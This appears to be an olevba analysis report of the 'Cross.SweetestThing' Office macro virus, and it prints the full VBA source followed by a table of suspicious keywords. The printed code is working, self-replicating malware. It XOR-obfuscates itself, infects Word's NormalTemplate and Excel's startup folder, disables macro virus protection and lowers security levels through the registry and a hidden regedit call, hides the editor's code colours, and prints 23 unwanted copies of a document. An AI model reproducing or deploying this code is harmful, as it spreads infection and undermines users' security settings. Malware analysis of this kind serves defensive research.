olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Weete-60ff7c6bc46e0f98a01135e1d3cd9b589726fa37
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Weete-60ff7c6bc46e0f98a01135e1d3cd9b589726fa37 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Class1.cls 
in file: Virus.MSOffice.Weete-60ff7c6bc46e0f98a01135e1d3cd9b589726fa37 - OLE stream: 'Macros/VBA/Class1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Function c(s, k)
For l = 1 To Len(s): c = c & Chr(Asc(Mid(s, l, 1)) Xor k): Next
End Function
Private Sub Document_Open()
For b = 1 To 136: If Mid(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(b, 1), 1, 1) = Chr(39) Then ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine b, c(Mid(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(b, 1), 2), Val(Mid(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(140, 1), 2))) & Chr(39)
Next: w
End Sub
Private Sub Document_Close(): Document_Open: End Sub
Private Sub Workbook_Open()
For b = 1 To 136: If Mid(ThisWorkbook.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.Lines(b, 1), 1, 1) = Chr(39) Then ThisWorkbook.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.ReplaceLine b, c(Mid(ThisWorkbook.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.Lines(b, 1), 2), Val(Mid(ThisWorkbook.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.Lines(140, 1), 2))) & Chr(39)
Next: e
End Sub
Private Sub Workbook_BeforeClose(Cancel As Boolean): Workbook_Open: End Sub
Private Sub w()
On Error Resume Next: st: bss '
Randomize: Set o = ThisDocument.VBProject.VBComponents(1).CodeModule '
o.ReplaceLine 140, Chr(39) & (211 + Int(Rnd * 39)) '
For l = 1 To 136 '
If Right(o.Lines(l, 1), 1) = Chr(39) Then o.ReplaceLine l, Left(Chr(39) & c(o.Lines(l, 1), Val(Mid(o.Lines(140, 1), 2))), Len(o.Lines(l, 1)) - 1) '
Next '
If ThisDocument = ActiveDocument Then Set h = NormalTemplate Else Set h = ActiveDocument '
With h.VBProject.VBComponents(1).CodeModule '
If .Lines(1, 1) <> "Private Function c(s, k)" Then '
.deletelines 1, .countoflines '
.InsertLines 1, o.Lines(1, 141) '
If h = ActiveDocument And ActiveDocument.Path <> "" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument '
End If '
End With '
ThisDocument.Save '
Set x = GetObject(, "excel.application") '
If x = "" Then Set x = CreateObject("excel.application"): q = True '
If UCase(Dir(x.Application.StartupPath & "\Mappe.")) <> "MAPPE" Then '
Set b = x.Workbooks.Add '
b.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.InsertLines 1, o.Lines(1, 141) '
j = "Cause it's a bitter sweet symphony that's life" '
b.SaveAs x.Application.StartupPath & "\Mappe.": b.Close '
End If '
If q = True Then x.Quit '
End Sub
Private Sub e()
On Error Resume Next: st: bst '
Randomize: Set o = ThisWorkbook.VBProject.VBComponents("DieseArbeitsmappe").CodeModule '
o.ReplaceLine 140, Chr(39) & (211 + Int(Rnd * 39)) '
For l = 1 To 136 '
If Right(o.Lines(l, 1), 1) = Chr(39) Then o.ReplaceLine l, Left(Chr(39) & c(o.Lines(l, 1), Val(Mid(o.Lines(140, 1), 2))), Len(o.Lines(l, 1)) - 1) '
Next '
If UCase(Dir(Application.StartupPath & "\Mappe.")) <> "MAPPE" Then Workbooks.Add.SaveAs Application.StartupPath & "\Mappe." '
For Each t In Workbooks '
If t.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.Lines(1, 1) <> "Private Function c(s, k)" Then '
t.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.deletelines 1, t.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.countoflines '
t.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.InsertLines 1, ThisWorkbook.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.Lines(1, 141) '
If t.Path <> "" Then t.Save Else t.SaveAs t.FullName '
End If '
Next '
ThisWorkbook.Save '
Set x = GetObject(, "word.application") '
If x = "" Then Set x = CreateObject("word.application"): q = True '
If x.NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, 1) <> "Private Function c(s, k)" Then '
x.NormalTemplate.VBProject.VBComponents(1).CodeModule.deletelines 1, x.NormalTemplate.VBProject.VBComponents(1).CodeModule.countoflines '
x.NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, ThisWorkbook.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.Lines(1, 141) '
j = "I need to hear some sounds that recognize the pain in me yeah" '
x.Options.SaveNormalPrompt = (Rnd * 0): x.NormalTemplate.Save '
End If '
If q = True Then x.Quit '
End Sub
Private Sub st()
On Error Resume Next '
Application.StatusBar = False: Application.EnableCancelKey = (Rnd * 0) '
If Application.Name = "Microsoft Word" Then '
Application.Options.SaveNormalPrompt = (Rnd * 0) '
Application.Options.ConfirmConversions = (Rnd * 0) '
Application.Options.SendMailAttach = vbWhite '
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeBackColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1" '
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeForeColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1" '
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "EndProcLine") = &H0 '
If Application.Version = "9.0" Then '
Application.CommandBars("Macro").Controls(3).Enabled = (Rnd * 0) '
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = &H1 '
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security", "Level") = &H1 '
Else '
Options.VirusProtection = (Rnd * 0): Application.CommandBars("Tools").Controls(12).Enabled = (Rnd * 0) '
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = &H0 '
End If '
End If '
If Application.Name = "Microsoft Excel" Then '
If Application.Version = "9.0" Then Application.CommandBars("Macro").Controls(3).Enabled = (Rnd * 0) Else Application.CommandBars("Tools").Controls(11).Enabled = (Rnd * 0) '
Open "c:\sweet.reg" For Output As #23 '
Print #23, "REGEDIT4" '
Print #23, "" '
Print #23, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]" '
Print #23, """Options6""=dword:00000000" '
Print #23, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]" '
Print #23, """Level""=dword:00000001" '
Print #23, "[HKEY_CURRENT_USER\Software\Microsoft\VBA\Office]" '
Print #23, """CodeForeColors""=""1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1""" '
Print #23, """CodeBackColors""=""1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1""" '
Print #23, """EndProcLine""=dword:00000000" '
Close #23 '
Shell "regedit /s c:\sweet.reg", vbHide '
End If '
j = "I let the melody shine, let it climb my mind, I feel free now..." '
End Sub
Private Sub bss()
On Error Resume Next '
If Minute(Now()) < 23 And Second(Now()) > 23 Then MsgBox "I see the sun begin to rise" & vbCr & "And I'm wounded" & vbCr & "I've seen the world with painted eyes" & vbCr & "That I'm crying through" & vbCr & "I watch the darkness hit the tides" & vbCrLf & "And confide in..." & vbCr & vbCr & "Hold on...", vbInformation, "Cross.SweetestThing" '
If Day(Now()) = 25 And Month(Now()) = 4 Then MsgBox "1, 2, 3... heXbabe and jackie got together", vbInformation, "Cross.SweetestThing" '
If Minute(Now()) = Second(Now()) And Minute(Now()) > 55 Then MsgBox "'Cause it's a bitter sweet symphony, that's life...", vbInformation, "Cross.SweetestThing" '
If Minute(Now()) = Second(Now()) Then '
MsgBox "Ouuuooh, the sweetest thing...", vbInformation, "Cross.SweetestThing" '
Application.ScreenUpdating = (Rnd * 0): Documents.Add '
Selection.Font.Name = "Tahoma": Selection.Font.Size = 14 '
Selection.TypeText "I'll dream your arms around me" & vbCrLf & "your heartbeat next to mine" & vbCrLf & "a dream of love to guide me" & vbCrLf & "I will dream your hand in mine" & vbCrLf & "once again." & vbCrLf & " " & vbCrLf & "I dream to hear you calling" & vbCrLf & "I dream to touch your heart" & vbCrLf & "I dream of love to follow" & vbCrLf & "I dream your lips on mine" & vbCrLf & "once again." & vbCrLf & " " & vbCrLf '
Selection.TypeText "'Cause I love you darling!" & vbCrLf & "I'll dream your arms around me" & vbCrLf & "your heartbeat next to mine" & vbCrLf & "once again!" & vbCrLf & " " & vbCrLf & "All your dreams collide" & vbCrLf & "All your nightmares cold and stranded" & vbCrLf & "Let love decide" & vbCrLf & "Let love take the day" & vbCrLf & "the right way!" '
ActiveDocument.PrintOut Copies:=23: ActiveDocument.Close savechanges:=wdDoNotSaveChanges '
j = "{Cross.SweetestThing (c) 2000 jackie" '
End If '
End Sub
Private Sub bst()
On Error Resume Next '
If Minute(Now()) < 23 And Second(Now()) > 23 Then MsgBox "I see the sun begin to rise" & vbCr & "And I'm wounded" & vbCr & "I've seen the world with painted eyes" & vbCr & "That I'm crying through" & vbCr & "I watch the darkness hit the tides" & vbCrLf & "And confide in..." & vbCr & vbCr & "Hold on...", vbInformation, "Cross.SweetestThing" '
If Day(Now()) = 25 And Month(Now()) = 4 Then MsgBox "1, 2, 3... heXbabe and jackie got together", vbInformation, "Cross.SweetestThing" '
If Minute(Now()) = Second(Now()) Then MsgBox "'Cause it's a bitter sweet symphony, that's life...", vbInformation, "Cross.SweetestThing" '
If Day(Now()) = 31 And Second(Now()) < 55 Then '
MsgBox "Ouuuooh, the sweetest thing...", vbInformation, "Cross.SweetestThing" '
Application.EnableCancelKey = (Rnd * 0) '
Range("A1").FormulaR1C1 = "I'll dream your arms around me": Range("A2").FormulaR1C1 = "your heartbeat next to mine": Range("A3").FormulaR1C1 = "a dream of love to guide me": Range("A4").FormulaR1C1 = "I will dream your hand in mine": Range("A5").FormulaR1C1 = "once again." '
Application.StatusBar = "Cross.SweetestThing" '
For i = 1 To 20000: Range((Chr(65 + Int(Rnd * 15)) & (Int(Rnd * 70) + 1))).Interior.ColorIndex = (Rnd * 55) + 1: Next '
Application.StatusBar = False '
End If '
j = "Cause it's a bitter sweet symphony that's life" '
j = "I need to hear some sounds that recognize the pain in me yeah" '
j = "I let the melody shine, let it climb my mind, I feel free now..." '

j = "{Cross.SweetestThing (c) 2000 jackie" '
End Sub
'{Cross.SweetestThing}
'{Written by a coder in love...}

'215

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |sweet.reg           |Executable file name                         |
+----------+--------------------+---------------------------------------------+
